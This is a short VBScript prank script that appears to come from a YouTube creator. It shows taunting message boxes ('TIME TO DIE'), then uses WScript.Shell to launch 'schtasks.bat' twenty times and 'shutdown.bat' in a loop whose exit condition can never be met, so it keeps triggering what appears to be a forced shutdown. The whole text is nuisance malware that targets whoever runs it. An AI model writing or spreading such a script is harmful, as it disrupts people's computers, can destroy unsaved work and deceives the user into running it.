x=msgbox("Are You Subscribed To Creeper39x?", Mabye+16, "You Better Be...")
x=msgbox("REALLY?", OK+16, "You Have One More Chance!")
x=msgbox("YOU ARNT!! Payback time!", OK+16, "TIME TO DIE")

dim count
set object = wscript.CreateObject("wscript.shell")

do
object.run "schtasks.bat"
count = count + 1
loop until count = 20

do
object.run "shutdown.bat"
count = count + 1
loop until count = 1
